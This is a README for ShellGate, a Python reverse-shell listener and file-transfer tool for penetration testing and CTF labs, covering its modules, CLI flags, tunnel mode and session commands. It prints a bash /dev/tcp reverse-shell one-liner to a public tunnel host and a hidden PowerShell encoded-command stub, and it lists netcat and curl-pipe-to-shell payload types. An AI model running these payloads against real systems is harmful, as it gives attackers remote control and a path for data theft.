# ShellGate

**ShellGate** (`v2.0.0`) is a zero-dependency Python 3 multi-session TCP listener, tunnel gate, and integrity-verified file transfer hub designed for authorized penetration testing, Red Team infrastructure, and CTF labs (Hack The Box, OSCP).

![Python](https://img.shields.io/badge/python-3.10%2B-blue)
![Dependencies](https://img.shields.io/badge/dependencies-stdlib%20only-brightgreen)
![License](https://img.shields.io/badge/license-MIT-lightgrey)

---

## Table of Contents

- [Key Features](#key-features)
- [Prerequisites](#prerequisites)
- [Architecture](#architecture)
- [How It Works Under the Hood](#how-it-works-under-the-hood)
- [Installation](#installation)
- [CLI Reference](#cli-reference)
- [Usage Examples](#usage-examples)
- [Pinggy Mode Guide & Examples](#pinggy-mode-guide--examples)
- [Interactive Session Commands](#interactive-session-commands)
- [Connection Matrix](#connection-matrix)
- [Security & Input Hardening](#security--input-hardening)
- [Testing & Project Structure](#testing--project-structure)
- [Operational Walkthrough](#operational-walkthrough)
- [License & Legal Notice](#license--legal-notice)

---

## Key Features

- **Zero External Dependencies:** Built exclusively on the Python 3.10+ standard library (`socket`, `select`, `threading`, `http.server`, `email.parser`, `hashlib`, `base64`, `shlex`, `argparse`). Runs out of the box on Kali Linux, macOS, and Windows.
- **Dual Endpoint Modes (`local` & `pinggy`):**
  - **Local / VPN Mode (`--mode local`):** Automatically detects active interface IPs in priority order (`tun0`, `tap0`, `eth1`, `eth0`, `tailscale0`), or accepts `--iface` / `--host`.
  - **Pinggy Tunnel Mode (`--mode pinggy`):** Launches a managed SSH TCP relay (`tcp@free.pinggy.io:443`), strips ANSI sequences to extract the public `tcp://<host>:<port>` endpoint, and terminates the subprocess cleanly on exit.
- **Echo-Safe Session Fingerprinting:** Automatically identifies target OS (`linux`, `mac`, `windows`), current user, and hostname using split-marker framing protected by per-session `threading.Lock`.
- **SHA-256 Verified File Transfers:**
  - `:upload <local> <remote>`: Transfers files in Base64 chunks over the active socket, decodes natively (`base64` / `certutil`), and verifies the **remote SHA-256 digest** against the local hash.
  - `:download <remote> <local>`: Streams Base64 output between split markers, strips whitespace/noise, validates Base64, writes locally, and reports the SHA-256 digest.
- **Python 3.13+ HTTP Staging Server (`--http-port`):** Optional threaded HTTP server serving files from `--srv-dir` and accepting `POST /upload` multipart file submissions without relying on the removed `cgi` module.

---

## Architecture

```text
+-------------------------------------------------------------------+
|                        ShellGate CLI (cli.py)                     |
+-------------+--------------------+--------------------+-----------+
              |                    |                    |
              v                    v                    v
   +------------------+  +------------------+  +------------------+
   | TunnelManager    |  | SessionManager   |  | StagingServer    |
   | (tunnel.py)      |  | (listener.py)    |  | (staging.py)     |
   | - local/VPN IP   |  | - TCP accept loop|  | - GET <srv-dir>  |
   | - Pinggy SSH     |  | - per-session    |  | - POST /upload   |
   +--------+---------+  |   io_lock        |  +------------------+
            |            | - OS/user/host   |
            v            +--------+---------+
   +------------------+           |
   | PayloadGenerator |           v
   | (payloads.py)    |  +------------------+
   | - bash / sh / py |  | TransferEngine   |
   | - nc / PS (UTF16)|  | (transfer.py)    |
   +------------------+  | - Base64 chunks  |
                         | - SHA-256 verify |
                         +------------------+
```

| Module | Responsibility |
| :--- | :--- |
| `shellgate/cli.py` | Argument parsing, interactive main menu, session I/O loop, and command dispatch |
| `shellgate/tunnel.py` | Interface IP detection (`ip -4 addr` / UDP fallback) and Pinggy SSH tunnel lifecycle |
| `shellgate/listener.py` | Thread-safe `SessionManager`, `select`-based `recv_until` / `drain_socket`, split-marker fingerprinting |
| `shellgate/transfer.py` | OS-aware quoting/validation, chunked Base64 upload with remote SHA-256 check, framed download |
| `shellgate/payloads.py` | Cross-platform connection snippet generator including UTF-16LE Base64 PowerShell encoder |
| `shellgate/staging.py` | Threaded HTTP staging server with Python 3.13+ `BytesParser` multipart handling |

---

## How It Works Under the Hood

### 1. Split-Marker Framing (Eliminating Command-Echo Races)
Interactive shells (`bash -i`, `zsh`, PTY wrappers, `cmd.exe`) often echo the incoming command line back over the socket before executing it. A naive listener waiting for a literal marker like `__PH_ID_E__` would trigger prematurely on the echoed command string itself.

ShellGate avoids this by splitting markers at the syntax level:
- **POSIX (`linux`, `mac`):** `printf '__PH_''ID_S__\n'` — the echoed command contains `'__PH_''ID_S__'`, whereas the actual executed output emits `__PH_ID_S__`.
- **Windows (`cmd.exe`):** `echo __PH_ID_^S__` — the caret escape (`^`) ensures `__PH_ID_S__` only appears in stdout after command execution.

### 2. Per-Session Socket Locking (`io_lock`)
Every `Session` owns a dedicated `threading.Lock` (`io_lock`). Background fingerprinting, interactive `recv`/`sendall`, `:upload`, and `:download` all acquire `io_lock` around socket reads/writes so concurrent probes and user commands never interleave bytes.

### 3. Chunked Transfer & Remote SHA-256 Integrity Check
During `:upload`, ShellGate computes the local SHA-256 digest before sending chunks (`1000` Base64 chars per line by default). After decoding on the target, it runs `sha256sum` (Linux), `shasum -a 256` (macOS/BSD), or `certutil -hashfile ... SHA256` (Windows) and compares the returned 64-hex-character digest against the local hash.

---

## Prerequisites

### Operator Host (Listener Side)
| Requirement | Mode | Details |
| :--- | :--- | :--- |
| **Python 3.10+** | All | Tested on Python 3.10–3.14 (Kali Linux, Ubuntu, macOS, Windows); zero third-party packages required |
| **OpenSSH Client (`ssh`)** | `--mode pinggy` | Must be available in `PATH` (`ssh -V`) to open the outbound `tcp@free.pinggy.io:443` relay |
| **Outbound TCP/443** | `--mode pinggy` | Operator machine must reach `free.pinggy.io` on port `443` (useful when inbound firewall/NAT blocks callbacks) |
| **`iproute2` (`ip` CLI)** | `--mode local` | Optional on Linux for automatic interface IP lookup (`tun0`, `tap0`, `eth1`, `eth0`); falls back to UDP probe if absent |
| **`pip` / `setuptools`** | Optional | Needed only for editable package install (`pip install --no-build-isolation --no-deps -e .`); `python3 -m shellgate` works without installing |

### Target Host (Callback & Transfer Side)
| Feature | Linux / macOS | Windows |
| :--- | :--- | :--- |
| **Fingerprinting** | `uname`, `whoami`, `hostname` | `ver`, `whoami`, `hostname` |
| **`:upload` / `:download`** | `base64` (`-d` / `-D`), `printf`, `rm` | `certutil` (`-decode`, `-hashfile`), `powershell` (`[System.IO.File]`, `[Convert]::ToBase64String`) |
| **SHA-256 Verification** | `sha256sum` or `shasum -a 256` *(gracefully degrades with `NO_HASH` if missing)* | `certutil -hashfile ... SHA256` |
| **`:pty` Upgrade** | `python3` (`pty.spawn`) or `script` | Not applicable (native console I/O) |

---

## Installation

```bash
# 1. Navigate into the project directory
cd shellgate

# 2. Editable install (Kali Linux / Debian Python 3.12+)
pip install --no-build-isolation --no-deps -e . --break-system-packages

# Optional: expose globally if ~/.local/bin is not in your PATH
sudo ln -sf ~/.local/bin/shellgate /usr/local/bin/shellgate

# Verify installation
shellgate --version
```

You can also run ShellGate directly without installation:

```bash
python3 -m shellgate --help
```

---

## CLI Reference

| Flag | Default | Description |
| :--- | :--- | :--- |
| `-p`, `--port` | `8888` | Local TCP port to bind for incoming shell sessions |
| `-b`, `--bind` | `0.0.0.0` | Local bind IP address |
| `-m`, `--mode` | `local` | Endpoint discovery mode: `local` (LAN/VPN IP) or `pinggy` (SSH TCP relay) |
| `-i`, `--iface` | `None` | Preferred network interface in `local` mode (e.g., `tun0`, `eth0`) |
| `--host` | `None` | Explicit callback IP/hostname override in `local` mode |
| `--http-port` | `0` | Enable HTTP staging server on the specified port (`0` = disabled) |
| `--srv-dir` | `./srv` | Root directory served by the HTTP staging server |
| `-V`, `--version` | — | Print version and exit |

---

## Usage Examples

```bash
# HTB / OSCP VPN listener on tun0:8888
shellgate --mode local --iface tun0 --port 8888

# VPN listener + HTTP staging server on port 8080 serving ./srv
shellgate --mode local --iface tun0 --port 8888 --http-port 8080 --srv-dir ./srv

# Public callback through Pinggy SSH tunnel (no port forwarding required)
shellgate --mode pinggy --port 8888

# Explicit callback IP override
shellgate --mode local --host 10.10.14.5 --port 9001
```

---

## Pinggy Mode Guide & Examples

Pinggy exposes your local ShellGate TCP listener through a public `*.run.pinggy-free.link:<port>` endpoint over an outbound SSH connection to port `443` — ideal when testing from behind CGNAT, hotel/corporate Wi-Fi, or cloud VMs without inbound port forwarding.

### 1. Pre-Flight Check
Verify `ssh` is installed and outbound port `443` reaches Pinggy:

```bash
ssh -V
ssh -p 443 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -T tcp@free.pinggy.io
# Press Ctrl+C after confirming connection (no errors/timeouts)
```

### 2. Standard Pinggy Session (Default Port `8888`)
```bash
shellgate --mode pinggy --port 8888
```

Live output:
```text
--- SHELLGATE v2.0.0 (PINGGY) ---
[Listener]: 0.0.0.0:8888 | [Endpoint]: tcp://fptsf-1-47-78-113.run.pinggy-free.link:40317 | [Sessions]: 0
1. Payloads
2. Sessions
3. Exit

> 1

=== PAYLOADS (fptsf-1-47-78-113.run.pinggy-free.link:40317) ===

[bash_tcp]
bash -c 'bash -i >& /dev/tcp/fptsf-1-47-78-113.run.pinggy-free.link/40317 0>&1'

[powershell_b64]
powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand ...
```

### 3. Hardened Loopback-Only Bind + Custom Port
Bind locally to `127.0.0.1` so the listener is unreachable on your LAN and accepts traffic **only** via the Pinggy SSH tunnel:

```bash
shellgate --mode pinggy --bind 127.0.0.1 --port 9001
```

### 4. File Transfers Over Pinggy (Single-Tunnel Advantage)
The free Pinggy TCP tier forwards **one TCP port per tunnel**. Because ShellGate's `:upload` and `:download` run inline over the active shell socket using split-marker Base64 framing, you do **not** need a second port or HTTP tunnel to transfer tools or artifacts:

```text
> 2
Session ID: 1
:upload ./linpeas.sh /tmp/linpeas.sh
[*] Uploading chunk 85/85
[+] Uploaded 84512 bytes (SHA-256 verified: 3c8a9e2b14d0...)

:download /etc/hosts ./hosts_target.txt
[+] Saved ./hosts_target.txt (248 bytes, SHA-256: 7b11c39f2a01...)
```

### 5. Pinggy Operational Notes & Troubleshooting
| Symptom / Constraint | Cause & Fix |
| :--- | :--- |
| `[Endpoint]: WAITING...` or `FAILED` | Outbound TCP/443 to `free.pinggy.io` blocked by local firewall/proxy, or `ssh` missing in `PATH` |
| Tunnel disconnects after ~60 minutes | Pinggy free-tier sessions expire after 60 minutes; restart `shellgate --mode pinggy` to obtain a fresh endpoint |
| Target cannot connect to `*.run.pinggy-free.link:<port>` | Target environment restricts outbound egress to high dynamic TCP ports (`10000–65535`) — verify target DNS/egress |
| Do not pair `--http-port` with `--mode pinggy` | Free Pinggy TCP mode forwards only `--port`; use inline `:upload`/`:download` instead of HTTP staging |

---

## Interactive Session Commands

Inside an active session, ShellGate intercepts colon-prefixed control commands while forwarding all other input directly to the remote shell:

| Command | Description |
| :--- | :--- |
| `:help` | Display all interactive session commands |
| `:check` | Run quick host triage (`id; uname -a; ip -brief a` on POSIX, `whoami & hostname & ipconfig` on Windows) |
| `:pty` | Spawn an interactive PTY (`python3` `pty.spawn` or `script`) and set `TERM=xterm-256color` |
| `:upload <local> <remote>` | Upload a local file (supports quoted paths with spaces) and verify remote SHA-256 |
| `:download <remote> <local>` | Download a remote file via framed Base64 stream and compute local SHA-256 |
| `:rename <alias>` | Assign a human-readable alias to the session (shown in session list) |
| `:info` | Print session ID, OS, user/host, IP:port, and connection timestamp |
| `:kill` | Close the current session and socket |
| `:back` | Return to the main menu while keeping the session alive in the background |

---

## Connection Matrix

Press `1` (`Payloads`) in the main menu to generate copy-ready one-liners bound to the active endpoint:

| Key | Target | Notes |
| :--- | :--- | :--- |
| `bash_tcp` | Linux / macOS | Standard `/dev/tcp` interactive Bash session |
| `sh_mkfifo` | Linux / BusyBox | Named pipe (`mkfifo`) compatible with OpenBSD `nc` without `-e` |
| `python3` | Linux / macOS | Socket + `pty.spawn("/bin/sh")` |
| `nc_traditional` | Linux | Traditional Netcat (`nc -e /bin/sh`) |
| `powershell_b64` | Windows | UTF-16LE Base64 `-EncodedCommand` TCP client |
| `curl_exec` | Linux / macOS | Shown when `--http-port` is active (`curl ... \| sh`) |
| `iwr_ps` | Windows | Shown when `--http-port` is active (`iex(irm ...)`) |

---

## Security & Input Hardening

- **POSIX Quoting:** Remote file paths passed to `rm`, `base64`, `sha256sum`, and `shasum` are escaped via `shlex.quote()`.
- **Windows Path Validation:** Upload paths on Windows reject shell metacharacters (`\r`, `\n`, `&`, `|`, `>`, `<`, `^`, `"`); PowerShell download paths escape single quotes safely.
- **Staging Upload Guardrails:** HTTP `POST /upload` validates numeric `Content-Length` (capped at `100 MiB`), extracts multipart files via `email.parser.BytesParser`, and strips directory components with `os.path.basename()` to prevent path traversal outside `<srv-dir>/uploads/`.

---

## Testing & Project Structure

```text
shellgate/
├── shellgate/
│   ├── __init__.py
│   ├── __main__.py
│   ├── cli.py
│   ├── listener.py
│   ├── payloads.py
│   ├── staging.py
│   ├── transfer.py
│   └── tunnel.py
├── tests/
│   └── test_shellgate.py
├── WALKTHROUGH.md
├── pyproject.toml
├── LICENSE
└── README.md
```

Run the automated test suite (covers CLI parsing, tunnel resolution, PowerShell UTF-16LE encoding, quoting/validation, live loopback socket fingerprinting + SHA-256 upload/download, and HTTP staging traversal defense):

```bash
python3 -m unittest discover -s tests -v
```

---

## Operational Walkthrough

For a complete end-to-end operational scenario (from staging files to GitHub publishing), see **[WALKTHROUGH.md](WALKTHROUGH.md)**.

---

## License & Legal Notice

Released under the [MIT License](LICENSE).

> **Authorized Use Only:** ShellGate is intended solely for authorized penetration testing, security research, and educational CTF environments. Always obtain explicit written authorization before testing any network or host you do not own.
